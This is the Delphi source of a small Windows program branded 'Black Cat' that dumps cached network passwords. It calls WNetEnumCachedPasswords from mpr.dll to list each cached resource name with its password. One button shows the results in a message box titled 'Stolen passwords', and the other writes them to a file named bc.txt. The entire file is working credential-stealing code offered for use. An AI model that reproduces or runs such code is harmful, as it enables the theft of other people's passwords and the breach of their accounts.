   unit getcachedpass;

   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     StdCtrls, Buttons, ExtCtrls;

   type
     TForm1 = class(TForm)
       Image1: TImage;
       BitBtn1: TBitBtn;
       BitBtn2: TBitBtn;
       StaticText1: TStaticText;
       StaticText2: TStaticText;
       StaticText3: TStaticText;
       StaticText4: TStaticText;
       StaticText5: TStaticText;
       StaticText7: TStaticText;
       StaticText8: TStaticText;
       Bevel1: TBevel;
       procedure BitBtn1Click(Sender: TObject);
       procedure BitBtn2Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   Type
     TPasswordCacheEntry = packed record
      cbEntry    : word;   // size of this entry, in bytes
      cbResource : word;   // size of resource name, in bytes
      cbPassword : word;   // size of password, in bytes
      iEntry     : byte;   // entry index
      nType      : byte;   // type of entry
      abResource : array [0..$FFFFFFF] of char;
     end;
     TPPasswordCacheEntry = ^TPasswordCacheEntry;

   var
     Form1: TForm1;

   implementation

   {$R *.DFM}

   var
     ResultString: string = '';

   function EnumPasswordCallbackProc(pce: TPPasswordCacheEntry; pdw: cardinal) : LongBool; stdcall;
   var
   s1 : string;
   s2 : string;
   begin
     result:=true;

     SetLength(s1,pce^.cbResource);
     Move(pce^.abResource[0],pointer(s1)^,pce^.cbResource);

     SetLength(s2,pce^.cbPassword);
     Move(pce^.abResource[pce^.cbResource],pointer(s2)^,pce^.cbPassword);

     ResultString:= ResultString + ' ' + s1 + ' | ' + s2 + #13#10;
   end;

   function GetCachedPasswords: string;
   var WNetEnumCachedPasswords : function (ps: pchar; pw: word; pb: byte; proc: pointer; bdw: cardinal) : word; stdcall;
       mpr                     : cardinal;
   begin
     mpr:=LoadLibrary('mpr');
     if mpr<>0 then
       try
         WNetEnumCachedPasswords:=GetProcAddress(mpr,'WNetEnumCachedPasswords');
         if @WNetEnumCachedPasswords<>nil then
         begin
           ResultString:= '';
           try
             WNetEnumCachedPasswords(nil,0,$FF,@EnumPasswordCallbackProc,0);
           finally
           end;
         end;
       finally
         FreeLibrary(mpr)
       end;
     Result:= ResultString;
   end;


   procedure TForm1.BitBtn1Click(Sender: TObject);
   begin
     Application.MessageBox (Pchar('Founded passwords: '#13#10#13#10+GetCachedPasswords),'Stolen passwords',MB_OK);
   end;

   procedure TForm1.BitBtn2Click(Sender: TObject);
   Var f : TextFile; s:String;
   begin s:=GetCachedPasswords;
     AssignFile(f,'bc.txt'); Rewrite(f);
     write(f,s);
     CloseFile(f); GetDir(0,s);
     application.MessageBox(Pchar('Ready! File created: '+s+'\bc.txt'),'Black Cat',Mb_OK);
   end;

   end.
